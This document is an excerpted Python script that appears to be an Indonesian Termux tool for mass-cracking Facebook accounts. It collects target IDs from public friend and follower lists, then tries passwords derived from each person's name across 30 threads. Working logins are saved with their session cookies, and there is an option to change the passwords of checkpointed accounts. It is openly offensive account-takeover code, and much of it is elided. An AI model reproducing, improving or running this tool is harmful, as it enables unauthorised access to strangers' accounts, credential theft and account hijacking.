# Code By Gedang
# Facebook NYONG SAPA
# Whatsapp 0838-0192-3083
# Github github.com/Godongblarak
#
  #
    #
      #
...
def banner():
	os.system('clear')
	cd = """\n     ___   _                  _           • author   : NAZRI X YUMASSA X GODONG      
    / __| (_)  _ __    _ __  | |  ___     • facebook : NYONG SAPA
    \__ \ | | | '  \  | '_ \ | | / -_)    • whatsapp : 0812-2152-3195
    |___/ |_| |_|_|_| | .__/ |_| \___|    • github   : github.com/Godongblarak
                      |_|                 • version  : V0.0.1\n """
	cd2 = nel(cd, style = 'green')
	cetak(nel(cd2, title = 'LOGO'))
...
def Masuk():
	...
	try:
		...
		os.system('clear')
		banner()
		cc = '\n[01] login cookie (crack facebook)\n[00] keluar\n'
		cc2 = nel(cc, style = 'green')
		cetak(nel(cc2, title = 'LOGGIN'))
		while True:
			rom = input ("\n%s\x1b[1;92m# %s\x1b[1;97mPilih %s\x1b[1;93m> %s"%(P,O,M,K))
			if rom in(""):
				print("%s%s isi yang benar "%(M,til))
			elif rom in ('1','01'):
				caa = '\n!! wajib menggunakan akun tumbal\n'
				caa2 = nel(caa, style = 'green')
				cetak(nel(caa2, title = 'WARNING'))
				kukis = input("%s\x1b[1;92m# %s\x1b[1;97mCookie %s\x1b[1;93m> %s\x1b[1;92m"%(P,O,M,K))
				if kukis in(""):
		...
		try:
			...
			if "mbasic_logout_button" in cek:
				...
				if "Laporkan Masalah" in cek:
					...
					#mikey.usernem()
					print ("\n%s \x1b[1;92m√ \x1b[1;97mlogin berhasil "%(H));jeda(2)
					pilihan().menu()
				else:
					#mikey = login.bot(romz_xyz(self.cok),self.url)
					#mikey.lang(romz_xyz(self.cok))
					#informasi.info(romz_xyz(self.cok),cek).myinfo()
					print ("\n%s \x1b[1;92m√\x1b[1;97m login berhasil "%(H));jeda(2)
					pilihan().menu()
			elif 'checkpoint' in cek:
				exit ("%s\x1b[1;93m× \x1b[1;97mlogin checkpoint "%(M));jeda(2)
			else:
...
def konverter(kukis): 
	...
	try:
		...
		if 'EAAG' in romz:
			...
			ahi = '\n%s\n'%(romz)
			ahi2 = nel(ahi, style = 'green')
			cetak(nel(ahi2, title = 'TOKEN KAMU'))
			login_bot(romz)
...
class Menu():
	...
	def tentang(self):
		...
		if "mbasic_logout_button" not in a:
			...
			os.system('clear')
			banner()
			xxx = '\n[++] ip kamu : %s\n[++] country : %s\n\n[01] crack dari id publik/teman (massal)\n[02] crack dari id followers\n[03] lihat hasil crack\n[00] logout (hapus cookie)\n'%(IP,CN)
			xxx2 = nel(xxx, style = 'green')
			cetak(nel(xxx2, title = 'MENU'))
...
class pilihan:
	...
	def menu(self):
		...
		if slut in['',' ']:
			...
			gan = input ("\n%s\x1b[1;92m%s%s \x1b[1;97mingin crack massal id\x1b[1;93m? \x1b[1;97my\x1b[1;92m/\x1b[1;97mt%s \x1b[1;93m>%s "%(U,til,O,M,K))
			if gan in[""]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			elif gan in['y','Y']:
				try:
				...
				print ("\n%s\x1b[1;92m%s %s\x1b[1;97mPastikan daftar teman bersifat publik "%(U,til,O))
				idt = input('%s\x1b[1;92m%s %s\x1b[1;97mUsername\x1b[1;92m/\x1b[1;97mId%s\x1b[1;93m > %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			...
			print ("\n%s\x1b[1;92m%s %s\x1b[1;97mPastikan target terdapat pengikut nya "%(U,til,O))
			idt = input('%s\x1b[1;92m%s %s\x1b[1;97mUsername\x1b[1;92m/\x1b[1;97mId%s \x1b[1;93m> %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			else:
			...
			aaa = '\n[01] lihat hasil crack\n[02] hapus hasil crack\n[00] kembali\n'
			aaa2 = nel(aaa, style = 'green')
			cetak(nel(aaa2, title = 'MENU'))
			rom = input('\n%s\x1b[1;92m# %s\x1b[1;97mPilih %s\x1b[1;93m> %s'%(P,O,M,K))
			cek_cek(rom)
		elif slut in['0','00','000']:
			print ('\n%s\x1b[1;92m%s \x1b[1;97mmenghapus data login dari termux '%(M,til));jeda(1)
			try:
			...
			jalan('\n%s\x1b[1;92m√ \x1b[1;97mberhasil terhapus '%(H))
			exit()
	...
	def MassalGRAPH(self, token):
		try:
			jum = int(input('%s\x1b[1;92m%s %s\x1b[1;97mJumlah target%s \x1b[1;93m> %s'%(U,til,O,M,K)))
			print ("\n%s\x1b[1;92m%s %s\x1b[1;97mPastikan daftar teman bersifat publik "%(U,til,O))
		except:jum=1
		for t in range(jum):
			t +=1
			idt = input('%s\x1b[1;92m%s %s\x1b[1;97mUsername\x1b[1;92m/\x1b[1;97mId %s%s%s \x1b[1;93m> %s'%(U,til,O,P,t,M,K))
			if idt in['']:
				print
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
		...
		try:
			print ('')
			print(f"\r{U}\x1b[1;92m{til}{O} \x1b[1;97mMengumpulkan Id {M}\x1b[1;93m> {U}\x1b[1;93m[{H}\x1b[1;92m{len(self.id)}{U}\x1b[1;93m] ",end="")
		except:
			pass
...
def user_agentAPI():
	ugent =[
	    ...
	    "Mozilla/5.0 (Mozilla/5.0 (Linux; Android 11; RMX3171 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36 GoogleApp/13.10.16.23.arm64",
...
class Crack:
	...
	def romiy(self, id):
		...
		unikers = input('\n%s\x1b[1;92m%s%s \x1b[1;97mgunakan password manual\x1b[1;93m? \x1b[1;97my\x1b[1;92m/\x1b[1;97mt%s\x1b[1;93m > %s'%(U,til,O,M,K))
		if unikers in ('Y', 'y'):
			print ('\n%s\x1b[1;92m%s%s \x1b[1;97mcontoh%s \x1b[1;93m>%s \x1b[1;97msayang%s\x1b[1;92m,%s\x1b[1;97mpengen%s\x1b[1;92m,%s\x1b[1;97mngentot'%(U,til,O,M,O,M,O,M,O))
			while True:
				pwx = input('%s\x1b[1;92m%s%s \x1b[1;97mpassword %s\x1b[1;93m> %s'%(U,til,O,M,K))
				if pwx == '':
					print ('\n%s%s jangan kosong '%(M,til))
				elif len(pwx)<=5:
					print ('\n%s\x1b[1;92m%s \x1b[1;97mpassword minimal \x1b[1;93m6 \x1b[1;97mkarakter'%(M,til))
					exit()
				else:
					def manual(brute=None):
						...
						if ind =='':
							...
							print ('\n%s\x1b[1;92m%s%s \x1b[1;97makun %s\x1b[1;93m[\x1b[1;92mOK\x1b[1;93m] %s\x1b[1;97mtersimpan ke file %s\x1b[1;93m> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s\x1b[1;92m%s%s \x1b[1;97makun %s\x1b[1;92m[%s\x1b[1;93mCP%s\x1b[1;92m]%s\x1b[1;97m tersimpan ke file %s\x1b[1;92m> %s\x1b[1;93mCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							jalan ('\n%s\x1b[1;92m!%s \x1b[1;97msetiap crack \x1b[1;93m1k ID\x1b[1;92m, \x1b[1;97mmainkan mode pesawat \x1b[1;93m2 \x1b[1;97mdetik \n'%(U,O));jeda(0.2)
							...
							print ('\n%s\x1b[1;92m%s%s \x1b[1;97makun %s\x1b[1;93m[\x1b[1;92mOK\x1b[1;93m] %s\x1b[1;97mtersimpan ke file %s\x1b[1;93m> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s\x1b[1;92m%s%s \x1b[1;97makun %s\x1b[1;92m[%s\x1b[1;93mCP%s\x1b[1;92m]%s\x1b[1;97m tersimpan ke file %s\x1b[1;92m> %s\x1b[1;93mCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							jalan ('\n%s\x1b[1;92m!%s \x1b[1;97msetiap crack \x1b[1;93m1k ID\x1b[1;92m, \x1b[1;97mmainkan mode pesawat\x1b[1;93m 2 \x1b[1;97mdetik \n'%(U,O));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
							...
							manual()
					ahaha = '\n[++] pilih metode sesuka anda\n\n[01] metode free (fast)\n[02] metode mbasic (slow)\n[03] metode mobile (very slow)\n'
					ahaha2 = nel(ahaha, style = 'green')
					cetak(nel(ahaha2, title = 'METODE'))
					manual(pwx.split(','))
					break
		elif unikers in ('T', 't'):
			jsjk = '\n[++] pilih metode sesuka anda\n\n[01] metode free (fast)\n[02] metode mbasic (slow)\n[03] metode mobile (very slow)\n'
			jsjk2 = nel(jsjk, style = 'green')
			cetak(nel(jsjk2, title = 'METODE'))
			self.langsung()
		else:
	...
	def langsung(self):
		...
		if suuu == '':
			...
			print ('\n%s\x1b[1;92m%s%s \x1b[1;97makun %s\x1b[1;93m[\x1b[1;92mOK\x1b[1;93m] %s\x1b[1;97mtersimpan ke file %s\x1b[1;93m> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s\x1b[1;92m%s%s \x1b[1;97makun %s\x1b[1;92m[%s\x1b[1;93mCP%s\x1b[1;92m]%s \x1b[1;97mtersimpan ke file %s\x1b[1;92m> %s\x1b[1;93mCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s\x1b[1;92m!%s \x1b[1;97msetiap crack \x1b[1;93m1k ID\x1b[1;92m,\x1b[1;97m mainkan mode pesawat \x1b[1;93m2 \x1b[1;97mdetik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234"]
			...
			print ('\n%s\x1b[1;92m%s%s\x1b[1;97m akun %s\x1b[1;93m[\x1b[1;92mOK\x1b[1;93m] %s\x1b[1;97mtersimpan ke file %s\x1b[1;93m> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s\x1b[1;92m%s%s \x1b[1;97makun %s\x1b[1;92m[%s\x1b[1;93mCP%s\x1b[1;92m]%s\x1b[1;97m tersimpan ke file %s\x1b[1;92m> %s\x1b[1;93mCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s\x1b[1;92m!%s \x1b[1;97msetiap crack \x1b[1;93m1k ID\x1b[1;92m,\x1b[1;97m mainkan mode pesawat \x1b[1;93m2 \x1b[1;97mdetik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
			...
			print ('\n%s\x1b[1;92m%s%s\x1b[1;97m akun %s\x1b[1;93m[\x1b[1;92mOK\x1b[1;93m] %s\x1b[1;97mtersimpan ke file %s\x1b[1;93m> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s\x1b[1;92m%s%s \x1b[1;97makun %s\x1b[1;92m[%s\x1b[1;93mCP%s\x1b[1;92m]%s \x1b[1;97mtersimpan ke file %s\x1b[1;92m> %s\x1b[1;93mCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s\x1b[1;92m!%s\x1b[1;97m setiap crack \x1b[1;93m1k ID\x1b[1;92m, \x1b[1;97mmainkan mode pesawat \x1b[1;93m2 \x1b[1;97mdetik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
	...
	def touch(self, user, manual, **data):
		...
		sys.stdout.write('\r'+warna+'\x1b[1;92m[\x1b[1;93mproses\x1b[1;92m]\x1b[1;97m %s/%s \x1b[1;93m[%s\x1b[1;92mOK%s:%s%s%s\x1b[1;93m]\x1b[1;97m-\x1b[1;92m[%s\x1b[1;93mCP%s:%s%s%s\x1b[1;92m]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						month = bulan12[month]
						print ('\r %s\x1b[1;92m*--> \x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s %s %s\x1b[1;97m|\x1b[1;92m%s '%(H,user,pw,day,month,year,kukis))
						#os.popen("play-audio dapet.mp3")
						ok.append("%s|%s|%s %s %s|%s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" \x1b[1;92m*--> \x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s %s %s\x1b[1;97m|\x1b[1;92m%s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						...
						pass
					print ('\r %s\x1b[1;92m*--> \x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s '%(H,user,pw,kukis))
					#os.popen("play-audio dapet.mp3")
					ok.append('%s|%s|%s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' \x1b[1;92m*-->\x1b[1;92m %s\x1b[1;97m|\x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
					...
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s\x1b[1;93m*-->\x1b[1;93m %s\x1b[1;97m|\x1b[1;93m%s\x1b[1;97m|\x1b[1;93m%s %s %s  '%(K,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						cp.append("%s|%s|%s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write("\x1b[1;93m *-->\x1b[1;93m %s\x1b[1;97m|\x1b[1;93m%s\x1b[1;97m|\x1b[1;93m%s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						...
						pass
					print ('\r %s\x1b[1;93m*-->\x1b[1;93m %s\x1b[1;97m|\x1b[1;93m%s           '%(K,user,pw))
					#os.popen("play-audio dapet.mp3")
					cp.append('%s|%s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write("\x1b[1;93m *--> \x1b[1;93m%s\x1b[1;97m|\x1b[1;93m%s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
			...
			for pw in manual:
				...
				if 'c_user' in ses.cookies.get_dict():
					try:
						...
						#os.popen("play-audio dapet.mp3")
						ok.append("%s|%s|%s %s %s|%s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" \x1b[1;92m*-->\x1b[1;92m %s\x1b[1;97m|\x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s %s %s\x1b[1;97m|\x1b[1;92m%s"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
					...
					#os.popen("play-audio dapet.mp3")
					ok.append('%s|%s|%s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' \x1b[1;92m*--> \x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s\x1b[1;97m|\x1b[1;92m%s'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
...
def hasil(ok,cp):
	...
	if len(ok) != 0 or len(cp) != 0:
		print("\n%s\x1b[1;92m√ \x1b[1;97mfinished"%(H))
		print('%s\x1b[1;92m+%s\x1b[1;93m ---------------------------------------- %s\x1b[1;92m+'%(P,M,P))
		print('%s\x1b[1;92m• %s\x1b[1;92mOK%s\x1b[1;97m :\x1b[1;92m %s%s'%(U,H,M,H,str(len(ok))))
		print('%s\x1b[1;92m• %s\x1b[1;93mCP%s \x1b[1;97m: \x1b[1;93m%s%s'%(U,K,M,K,str(len(cp))))
		print('%s\x1b[1;92m+%s \x1b[1;93m---------------------------------------- %s\x1b[1;92m+'%(P,M,P))
		if len(cp)==0:
			exit()
		else:
			c = input('\n%s\x1b[1;92m%s%s \x1b[1;97mgunakan detektor checkpoint\x1b[1;93m?\x1b[1;97m y\x1b[1;92m/\x1b[1;97mt%s \x1b[1;93m> %s'%(U,til,O,M,K))
			if c =='':
				exit("%s%s Isi yang benar kentod "%(M,til))
			elif c in['Y','y']:
				jalan("\n%s\x1b[1;92m•%s \x1b[1;97mMode pesawatkan terlebih dahulu\x1b[1;93m 5\x1b[1;97m detik "%(U,O))
				pw=input("%s\x1b[1;92m%s%s \x1b[1;97mubah sandi akun one tab\x1b[1;93m? \x1b[1;97my\x1b[1;92m/\x1b[1;97mt %s\x1b[1;93m> %s"%(U,til,O,M,K))
				if pw =='':
					print ("%s%s isi yg benar kentod "%(M,til))
				elif pw in['y','Y']:
					ubah_pass.append("ubah_sandi")
					pw2=input("%s\x1b[1;92m%s%s \x1b[1;97mmasukan sandi %s\x1b[1;93m> %s"%(U,til,O,M,K))
					if len(pw2) <= 5:
						print("%s\x1b[1;92m%s \x1b[1;97msandi minimal \x1b[1;93m6 \x1b[1;97mkarakter "%(M,til))
					else:
						pwbaru.append(pw2)
				nomor=0
				for fb in cp:
					...
					ngecek  = akun.split(" ◊ ")
					nomor+=1
					print("\n%s\x1b[1;92m%s.%s \x1b[1;97mlogin akun %s\x1b[1;93m> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
					try:
						...
						pass
				print("\n%s\x1b[1;92m%s%s\x1b[1;97m Selesai mengecek akun"%(U,til,O));jeda(0.07)
				#os.popen('play-audio data/cek.mp3')
				input('%s\x1b[1;92m%s%s \x1b[1;93m[%s \x1b[1;97mEnter%s \x1b[1;93m] '%(U,til,O,U,O))
				pilihan().menu()
			elif c in['t','T']:
				exit()
			else:
		...
		exit(f"\n{M}\x1b[1;92m{til} \x1b[1;97mOps\x1b[1;93m... \x1b[1;97mtidak mendapatkan hasil\x1b[1;93m :(")
...
def cek_apk(kukis):
	...
	try:
		for i in range(len(game)):
			print ("\r      %s\x1b[1;92m[\x1b[1;97m+\x1b[1;92m]\x1b[1;97m Aplikasi aktif yang terkait\x1b[1;93m : \n\x1b[1;92m\_\x1b[1;97mAktif \x1b[1;92m[\x1b[1;97m%s.\x1b[1;92m] %s\x1b[1;92m%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
	...
	try:
		for i in range(len(game)):
			print ("\r      %s\x1b[1;93m[\x1b[1;97m+\x1b[1;93m] \x1b[1;97mAplikasi kedaluwarsa yang terkait\x1b[1;92m : \n\x1b[1;93m\_\x1b[1;97mKedaluwarsa \x1b[1;93m[\x1b[1;97m%s.\x1b[1;93m] %s\x1b[1;93m%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))

def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s\x1b[1;92m•%s\x1b[1;93m [%s \x1b[1;97mpilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
	for file in dirs:
...
def hapus_hasil():
	...
	print ('');jeda(2)
	jalan (H+'\x1b[1;92m √\x1b[1;97m berhasil menghapus hasil crack ');jeda(2)
	pilihan().menu()
	
def hasill():
	print ("\n%s\x1b[1;92m%s%s \x1b[1;93m01 %s\x1b[1;97mCek hasil akun %s\x1b[1;92mOK "%(U,til,P,O,H))
	print ("%s\x1b[1;92m%s%s \x1b[1;93m02 %s\x1b[1;97mCek hasil akun %s\x1b[1;93mCP "%(U,til,P,O,K))
	print ("%s\x1b[1;92m%s%s \x1b[1;93m00 %s\x1b[1;97mKembali "%(U,til,M,O))
...
def hasil_fb():
	...
	if l in['']:
		...
		dirs = os.listdir('OK')
		print ("\n%s\x1b[1;92m•%s\x1b[1;93m [%s\x1b[1;97m hasil crack yang tersimpan %s\x1b[1;93m]\n"%(U,O,U,O))
		for file in dirs:
			print("%s\x1b[1;92m•%s\x1b[1;93m> %s%s"%(U,M,H,file));jeda(0.07)
		try:
			file = input("\n%s\x1b[1;92m•%s \x1b[1;97mmasukan file %s\x1b[1;92m:%s "%(U,O,M,H));jeda(0.2)
			if file in['']:
		...
		print(" %s\x1b[1;92m# %s\x1b[1;93m---------------------------------------- %s\x1b[1;92m#"%(P,M,P));jeda(2)
		jalan("%s\x1b[1;92m•%s\x1b[1;97m hasil tanggal%s\x1b[1;92m : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
		print(" %s\x1b[1;92m# %s\x1b[1;93m---------------------------------------- %s\x1b[1;92m#%s"%(P,M,P,H));jeda(2)
		...
		print ("\n%s\x1b[1;92m•%s \x1b[1;93m[%s\x1b[1;97m hasil crack yang tersimpan %s\x1b[1;93m]\n"%(U,O,U,O))
		for file in dirs:
			print("%s\x1b[1;92m•%s\x1b[1;93m> %s%s"%(U,M,K,file));jeda(0.07)
		try:
			file = input("\n%s\x1b[1;92m•%s \x1b[1;97mmasukan file %s\x1b[1;92m:%s "%(U,O,M,K));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
		...
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s\x1b[1;92m# %s\x1b[1;93m---------------------------------------- %s\x1b[1;93m#"%(P,M,P));jeda(2)
		jalan("%s\x1b[1;92m•%s \x1b[1;97mhasil tanggal%s\x1b[1;92m : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)))
		print(" %s\x1b[1;92m# %s\x1b[1;93m---------------------------------------- %s\x1b[1;93m#%s"%(P,M,P,K));jeda(2)
